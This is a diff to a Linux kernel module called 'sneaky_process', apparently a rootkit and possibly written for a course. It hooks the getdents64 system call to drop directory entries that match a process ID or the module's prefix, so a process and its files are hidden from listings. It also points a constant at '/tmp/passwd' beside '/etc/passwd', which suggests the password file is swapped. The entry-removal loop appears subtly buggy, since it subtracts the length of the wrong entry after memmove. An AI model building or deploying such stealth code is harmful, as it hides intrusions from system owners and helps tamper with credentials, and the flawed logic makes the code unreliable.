@@ -11,7 +11,7 @@
 #include <linux/dirent.h>
 
 #define PREFIX "sneaky_process"
-#define TEMPASS "sneaky_process"
+#define TEMPASS "/tmp/passwd"
 #define ETCPASS "/etc/passwd"
 
 // static int pid;
@@ -66,8 +66,11 @@ asmlinkage int (*original_getdents64)(struct pt_regs *regs);
 asmlinkage int sneaky_getdents64(struct pt_regs *regs)
 {
   struct linux_dirent64 *dirp = (struct linux_dirent64 *)regs->si;
+  struct linux_dirent64 *cur_dirent;
+  struct linux_dirent64 *next_dirent;
   int nread = (*original_getdents64)(regs);
   int offset = 0;
+  int remaining_size;
 
   printk(KERN_INFO "get sneaky getdents64 with process id %s", pid);
   // error or nothing to read
@@ -76,14 +79,13 @@ asmlinkage int sneaky_getdents64(struct pt_regs *regs)
     return 0;
   }
 
-  // for (off = 0; off < nread;)
   while (offset < nread)
   {
-    struct linux_dirent64 *cur_dirent = (void *)dirp + offset;
+    cur_dirent = (void *)dirp + offset;
     if ((strcmp(cur_dirent->d_name, pid) == 0) || (strcmp(cur_dirent->d_name, PREFIX) == 0))
     {
-      void *next_dirent = (void *)cur_dirent + cur_dirent->d_reclen;
-      int remaining_size = nread - (offset + cur_dirent->d_reclen);
+      next_dirent = (void *)cur_dirent + cur_dirent->d_reclen;
+      remaining_size = nread - (offset + cur_dirent->d_reclen);
       memmove(cur_dirent, next_dirent, remaining_size);
       nread -= cur_dirent->d_reclen;
     }
